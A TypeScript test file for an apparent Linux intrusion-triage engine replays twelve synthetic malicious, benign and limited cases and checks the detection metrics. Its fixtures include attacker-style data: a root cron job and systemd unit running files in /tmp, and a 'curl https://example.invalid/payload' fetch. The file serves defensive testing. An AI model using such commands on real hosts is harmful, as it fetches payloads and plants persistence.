import { randomUUID } from "node:crypto";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { Type } from "typebox";
import type { CheckCategory, SecurityToolDefinition } from "../../src/domain/types.js";
import { evaluateInvestigation, parseInvestigationEvaluationManifest, type InvestigationEvaluationResult } from "../../src/evaluation/investigation-evaluator.js";
import { InvestigationCompletionValidator } from "../../src/investigation/completion-validator.js";
import { InvestigationScheduler } from "../../src/investigation/scheduler.js";
import type { InvestigationSession } from "../../src/investigation/types.js";
import type { NamespaceName, ScanEpoch, WireObservation } from "../../src/protocol-v2/types.js";
import { RuntimeStore } from "../../src/storage/runtime-store.js";
import { testTask } from "../helpers.js";

type Disposition = "MALICIOUS" | "BENIGN" | "LIMITED";
interface ReplayCase {
  caseId: string;
  disposition: Disposition;
  entryMode: "ZERO_IOC" | "SINGLE_LEAD";
  category: CheckCategory;
  observations: WireObservation[];
  edges?: Array<{ relation: string; from: number; to: number }>;
  evidenceIndexes?: number[];
  expectedGap?: string;
  actionFailure?: string;
}

const now = "2026-09-06T00:00:00.000Z";
const bootId = "11111111-1111-4111-8111-111111111111";
const processObservation = (pid: number, exe: string, extra: Record<string, unknown> = {}): WireObservation => ({
  namespace: "process", identity: { bootId, pid, startTicks: String(pid * 10) },
  fields: { bootId, pid, startTicks: String(pid * 10), exe, command: exe, uid: 1000, ...extra },
  observedAt: now, consistency: "OBJECT_STABLE",
});
const fileObservation = (inode: number, path: string): WireObservation => ({
  namespace: "file", identity: { mountId: "2049", device: "2049", inode: String(inode) },
  fields: { mountId: "2049", device: "2049", inode: String(inode), path, kind: "regular", size: 7, mtime: now, contentClass: "SENSITIVE_TEXT" },
  observedAt: now, consistency: "OBJECT_STABLE",
});

const cases: ReplayCase[] = [
  { caseId: "malicious-temp-egress", disposition: "MALICIOUS", entryMode: "ZERO_IOC", category: "linux_intrusion_triage", observations: [processObservation(101, "/tmp/.agent"), fileObservation(201, "/tmp/.agent")], edges: [{ relation: "executable", from: 0, to: 1 }], evidenceIndexes: [0, 1] },
  { caseId: "malicious-deleted-egress", disposition: "MALICIOUS", entryMode: "SINGLE_LEAD", category: "linux_intrusion_triage", observations: [processObservation(102, "/var/tmp/.deleted", { exeDeleted: true }), fileObservation(202, "/proc/102/exe")], edges: [{ relation: "executable", from: 0, to: 1 }], evidenceIndexes: [0, 1] },
  { caseId: "malicious-cron-download", disposition: "MALICIOUS", entryMode: "ZERO_IOC", category: "linux_persistence", observations: [
    { namespace: "cron_entry", identity: { source: "/etc/cron.d/update", line: 1, digest: "a".repeat(64) }, fields: { source: "/etc/cron.d/update", line: 1, digest: "a".repeat(64), schedule: "* * * * *", user: "root", command: "/usr/bin/python3 /tmp/update.py" }, observedAt: now, consistency: "OBJECT_STABLE" },
    fileObservation(203, "/tmp/update.py"),
  ], edges: [{ relation: "executes", from: 0, to: 1 }], evidenceIndexes: [0, 1] },
  { caseId: "malicious-unit-egress", disposition: "MALICIOUS", entryMode: "SINGLE_LEAD", category: "linux_persistence", observations: [
    { namespace: "unit", identity: { scope: "system", ownerUid: 0, name: "update.service", fragmentDigest: "b".repeat(64) }, fields: { scope: "system", ownerUid: 0, name: "update.service", fragmentDigest: "b".repeat(64), path: "/etc/systemd/system/update.service", enabled: true, active: true, generated: false, transient: false, execStart: "/tmp/update", user: "root" }, observedAt: now, consistency: "OBJECT_STABLE" },
    fileObservation(204, "/tmp/update"),
  ], edges: [{ relation: "executes", from: 0, to: 1 }], evidenceIndexes: [0, 1] },
  { caseId: "benign-package-update", disposition: "BENIGN", entryMode: "ZERO_IOC", category: "linux_intrusion_triage", observations: [processObservation(201, "/usr/bin/apt-get", { command: "/usr/bin/apt-get update" })] },
  { caseId: "benign-monitoring-agent", disposition: "BENIGN", entryMode: "SINGLE_LEAD", category: "linux_intrusion_triage", observations: [processObservation(202, "/opt/monitor/bin/agent")] },
  { caseId: "benign-admin-script", disposition: "BENIGN", entryMode: "ZERO_IOC", category: "linux_intrusion_triage", observations: [processObservation(203, "/usr/bin/bash", { command: "/usr/bin/bash /opt/admin/rotate.sh" })] },
  { caseId: "benign-web-worker", disposition: "BENIGN", entryMode: "SINGLE_LEAD", category: "linux_intrusion_triage", observations: [processObservation(204, "/usr/sbin/nginx", { command: "nginx: worker process" })] },
  { caseId: "limited-log-missing", disposition: "LIMITED", entryMode: "ZERO_IOC", category: "backdoor_account", observations: [processObservation(301, "/usr/sbin/sshd")], expectedGap: "LOG_SOURCE_UNAVAILABLE" },
  { caseId: "limited-budget", disposition: "LIMITED", entryMode: "SINGLE_LEAD", category: "linux_intrusion_triage", observations: [processObservation(302, "/usr/bin/curl", { command: "curl https://example.invalid/payload" })], expectedGap: "BUDGET_EXHAUSTED", actionFailure: "BUDGET_EXHAUSTED" },
  { caseId: "limited-target-disconnect", disposition: "LIMITED", entryMode: "ZERO_IOC", category: "linux_intrusion_triage", observations: [
    { namespace: "socket", identity: { protocol: "tcp", localAddress: "10.0.0.2", localPort: 49152, remoteAddress: "198.51.100.10", remotePort: 443, inode: "9001" }, fields: { protocol: "tcp", localAddress: "10.0.0.2", localPort: 49152, remoteAddress: "198.51.100.10", remotePort: 443, inode: "9001", state: "ESTABLISHED" }, observedAt: now, consistency: "POINT_IN_TIME" },
  ], expectedGap: "TARGET_UNAVAILABLE", actionFailure: "TARGET_UNAVAILABLE" },
  { caseId: "limited-evidence-corrupt", disposition: "LIMITED", entryMode: "SINGLE_LEAD", category: "linux_intrusion_triage", observations: [processObservation(304, "/tmp/corrupt")], evidenceIndexes: [0], expectedGap: "EVIDENCE_INTEGRITY_FAILED" },
];

describe("M2 自主调查 4 恶意 / 4 良性 / 4 受限回放矩阵", () => {
  let directory: string;
  let store: RuntimeStore;
  let result: InvestigationEvaluationResult;

  beforeAll(async () => {
    directory = await mkdtemp(join(tmpdir(), "huntwarden-investigation-matrix-"));
    store = await RuntimeStore.open(directory, "runtime.db");
    const definitions: Array<Record<string, unknown>> = [];
    for (const [caseIndex, definition] of cases.entries()) definitions.push(await executeCase(store, definition, caseIndex));
    const manifest = parseInvestigationEvaluationManifest({
      schemaVersion: 2,
      suiteId: "m2-controller-replay-4x4x4",
      environment: { targetOs: "independent-controller-replay", architecture: process.arch, transport: "SSH", applicationVersion: "0.2.0", protocolVersion: 2, manifestVersion: "3.0.0", helperVersion: "3.0.0", investigationEngineVersion: "1.0.0", ruleRegistryVersion: "2.3.0", playbookRegistryVersion: "1.3.0", commit: "0000000", budgetProfile: "STANDARD" },
      cases: definitions,
      thresholds: { minDiscoveryRecall: 1, minEvidencePreservation: 1, minObligationClosure: 1, maxBenignFalsePositive: 0, minRelationshipRecall: 1, minLimitedRecognition: 1, minAutonomousCompletion: 1 },
    });
    result = evaluateInvestigation(store, manifest);
  }, 30_000);

  afterAll(async () => { store?.close(); if (directory) await rm(directory, { recursive: true, force: true }); });

  it("12 个独立任务与冻结场景目录一致并全部满足门槛", async () => {
    const catalog = JSON.parse(await readFile(new URL("../../acceptance/investigation/scenario-catalog.json", import.meta.url), "utf8")) as { schemaVersion: number; cases: Array<{ caseId: string; disposition: string; entryMode: string }> };
    expect(catalog.schemaVersion).toBe(2);
    expect(catalog.cases.map(({ caseId, disposition, entryMode }) => ({ caseId, disposition, entryMode }))).toEqual(cases.map(({ caseId, disposition, entryMode }) => ({ caseId, disposition, entryMode })));
    expect(result.status).toBe("PASS");
    expect(result.cases).toHaveLength(12);
    expect(result.cases.filter((item) => item.disposition === "MALICIOUS")).toHaveLength(4);
    expect(result.cases.filter((item) => item.disposition === "BENIGN")).toHaveLength(4);
    expect(result.cases.filter((item) => item.disposition === "LIMITED")).toHaveLength(4);
    expect(result.cases.flatMap((item) => item.failureAttributions)).toEqual([]);
  });

  it("恶意链执行动作并保全证据，良性无最终误报，受限原因逐项命中", () => {
    expect(result.metrics).toMatchObject({
      discoveryRecall: { rate: 1 }, evidencePreservation: { rate: 1 }, obligationClosure: { rate: 1 },
      benignFalsePositive: { rate: 0 }, relationshipRecall: { rate: 1 }, limitedRecognition: { rate: 1 }, autonomousCompletion: { rate: 1 },
    });
    expect(result.cases.filter((item) => item.disposition === "MALICIOUS").every((item) => item.autonomousExecutedActions > 0 && item.completionStatus === "CLOSED_WITH_FINDINGS")).toBe(true);
    expect(result.cases.filter((item) => item.disposition === "BENIGN").every((item) => item.riskyCategories.length === 0 && item.completionStatus === "CLOSED_NO_OBSERVED_FINDING")).toBe(true);
    expect(result.cases.filter((item) => item.disposition === "LIMITED").every((item) => item.completionStatus === "LIMITED")).toBe(true);
    expect(result.cases.find((item) => item.caseId === "limited-budget")?.actionAttempts.some((item) => item.status === "FAILED")).toBe(true);
    expect(result.cases.find((item) => item.caseId === "limited-target-disconnect")?.actionAttempts.some((item) => item.status === "FAILED")).toBe(true);
  });
});

async function executeCase(store: RuntimeStore, definition: ReplayCase, caseIndex: number): Promise<Record<string, unknown>> {
  const task = testTask();
  task.taskId = `TASK-M2-${definition.caseId}`;
  task.protocolVersion = 2;
  task.checks = [definition.category];
  store.createTask(task);
  const epoch: ScanEpoch = { epochId: `EPOCH-M2-${definition.caseId}`, taskId: task.taskId, targetFingerprint: task.target.hostFingerprint, protocolVersion: 2, manifestVersion: "3.0.0", helperVersion: "3.0.0", reason: "INITIAL", status: "RUNNING", startedAt: now };
  store.createScanEpoch(epoch); task.activeEpochId = epoch.epochId; store.saveTask(task);
  const session: InvestigationSession = { sessionId: `ISESS-M2-${definition.caseId}`, taskId: task.taskId, epochId: epoch.epochId, engineVersion: "1.0.0", playbookRegistryDigest: "a".repeat(64), ruleRegistryDigest: "b".repeat(64), authorizationVersion: "AUTH-M2", executionStatus: "RUNNING", investigationStatus: "OPEN", revision: 0, createdAt: now, updatedAt: now };
  store.createInvestigationSession(session);
  const batch = store.commitFactBatch({
    taskId: task.taskId, epochId: epoch.epochId, sourceRunId: `RUN-${definition.caseId}`,
    source: { kind: "SYSTEM", evidenceOrigin: "TARGET_OBSERVATION" }, targetFingerprint: task.target.hostFingerprint,
    requestId: `REQUEST-${definition.caseId}`, collector: { name: "independent-replay", version: "1.0.0" },
    observations: definition.observations,
    edges: (definition.edges ?? []).map((edge) => ({ relation: edge.relation, fromIdentity: endpoint(definition.observations[edge.from]!), toIdentity: endpoint(definition.observations[edge.to]!), observedAt: now })),
    gaps: [], wireDigest: caseIndex.toString(16).padStart(64, "0"),
  });
  const coveragePartial = definition.caseId === "limited-log-missing";
  store.putCoverageRun({ coverageId: `COV-${definition.caseId}`, taskId: task.taskId, epochId: epoch.epochId, category: definition.category, presetId: "PRESET-M2-REPLAY", presetVersion: "1.0.0", status: coveragePartial ? "PARTIAL" : "COMPLETE", applicability: coveragePartial ? "UNKNOWN" : "APPLICABLE", completedCriteria: coveragePartial ? [] : ["independent_truth_observed"], missingCriteria: coveragePartial ? [{ criterion: "authentication_history", reasonCode: definition.expectedGap! }] : [], createdAt: now });
  store.putInvestigationObligation({ obligationId: `OBL-REACH-${definition.caseId}`, taskId: task.taskId, epochId: epoch.epochId, obligationKind: "INDEPENDENT_TRUTH_REACHED", dedupeKey: `INDEPENDENT_TRUTH_REACHED:${definition.caseId}`, subjectRefs: batch.facts.map((item) => item.subjectRef), required: true, status: "SATISFIED", resultRefs: batch.facts.map((item) => item.factId), gapRefs: [], createdAt: now, updatedAt: now });

  const evidenceBySubject = new Map<string, string>();
  for (const fact of batch.facts) {
    if (!definition.evidenceIndexes?.some((index) => batch.facts[index]?.factId === fact.factId)) continue;
    const evidenceId = `EV-${randomUUID()}`;
    store.putEvidence({ evidenceId, taskId: task.taskId, host: task.target.host, type: "collected_object", source: String(fact.privatePayload.path ?? fact.privatePayload.exe ?? fact.namespace), sha256: "c".repeat(64), tool: "collect", collectedAt: now, metadata: { epochId: epoch.epochId, subjectRef: fact.subjectRef, complete: true, integrityStatus: definition.caseId === "limited-evidence-corrupt" ? "FAILED" : "VERIFIED", range: { start: 0, length: 7, complete: true }, artifactSize: 7, artifactDigest: "c".repeat(64) } });
    evidenceBySubject.set(fact.subjectRef, evidenceId);
  }
  if (definition.disposition === "MALICIOUS") {
    for (const fact of batch.facts) if (!definition.evidenceIndexes?.some((index) => batch.facts[index]?.factId === fact.factId)) {
      const evidenceId = `EV-${randomUUID()}`;
      store.putEvidence({ evidenceId, taskId: task.taskId, host: task.target.host, type: "collected_object", source: fact.namespace, sha256: "d".repeat(64), tool: "collect", collectedAt: now, metadata: { epochId: epoch.epochId, subjectRef: fact.subjectRef, complete: true, integrityStatus: "VERIFIED", range: { start: 0, length: 1, complete: true }, artifactSize: 1, artifactDigest: "d".repeat(64) } });
      evidenceBySubject.set(fact.subjectRef, evidenceId);
    }
  }

  const tools = ["project", "relate", "collect", "query_facts", "verify", "resolve_derived_objects", "probe"].map((name): SecurityToolDefinition => ({
    name, label: name, description: name, parameters: Type.Object({}, { additionalProperties: true }), risk: "LOCAL", replayPolicy: "SAFE_REOBSERVE", timeoutMs: 1000, auditEvent: name,
    execute: async (_toolCallId, args) => {
      if (definition.actionFailure) throw new Error(definition.actionFailure);
      const subjectRef = typeof (args as Record<string, unknown>).ref === "string" ? String((args as Record<string, unknown>).ref) : undefined;
      const evidenceId = name === "collect" && subjectRef ? evidenceBySubject.get(subjectRef) : undefined;
      return { content: [{ type: "text", text: "{}" }], details: { status: "success", factRefs: batch.facts.map((item) => item.factId), ...(evidenceId ? { evidenceRefs: [evidenceId] } : {}) } };
    },
  }));
  await new InvestigationScheduler(store, task.taskId, epoch.epochId, session, tools).runUntilQuiescent(undefined, 20);
  if (definition.expectedGap) {
    store.putInvestigationObligation({ obligationId: `OBL-LIMIT-${definition.caseId}`, taskId: task.taskId, epochId: epoch.epochId, obligationKind: "EXPECTED_LIMIT", dedupeKey: `EXPECTED_LIMIT:${definition.caseId}`, subjectRefs: [batch.facts[0]!.subjectRef], required: true, status: "LIMITED", resultRefs: [batch.facts[0]!.factId], gapRefs: [definition.expectedGap], createdAt: now, updatedAt: now });
  }
  new InvestigationCompletionValidator(store).freeze(task.taskId, epoch.epochId);

  const expectedFacts = definition.observations.map((observation, index) => {
    const [field, value] = expectedField(observation);
    return { namespace: observation.namespace, field, value, ...(definition.evidenceIndexes?.includes(index) && definition.caseId !== "limited-evidence-corrupt" ? { evidenceRequired: true } : {}) };
  });
  return {
    caseId: definition.caseId, taskId: task.taskId, epochId: epoch.epochId, disposition: definition.disposition,
    entryMode: definition.entryMode, runKind: "FIRST", expectedCategories: [definition.category], expectedFacts,
    ...(definition.edges ? { expectedRelations: definition.edges.map((edge) => { const [fromField, fromValue] = expectedField(definition.observations[edge.from]!); const [toField, toValue] = expectedField(definition.observations[edge.to]!); return { relation: edge.relation, from: { namespace: definition.observations[edge.from]!.namespace, field: fromField, value: fromValue }, to: { namespace: definition.observations[edge.to]!.namespace, field: toField, value: toValue }, derivation: "OBSERVED" as const }; }) } : {}),
    ...(definition.expectedGap ? { expectedGapCodes: [definition.expectedGap] } : {}),
  };
}

function endpoint(observation: WireObservation): { namespace: NamespaceName; identity: Record<string, unknown> } {
  return { namespace: observation.namespace, identity: observation.identity };
}

function expectedField(observation: WireObservation): [string, string | number | boolean] {
  for (const field of ["exe", "path", "source", "name", "remoteAddress"] as const) {
    const value = observation.fields[field];
    if (typeof value === "string" || typeof value === "number" || typeof value === "boolean") return [field, value];
  }
  throw new Error(`无法为 ${observation.namespace} 选择独立真值字段`);
}
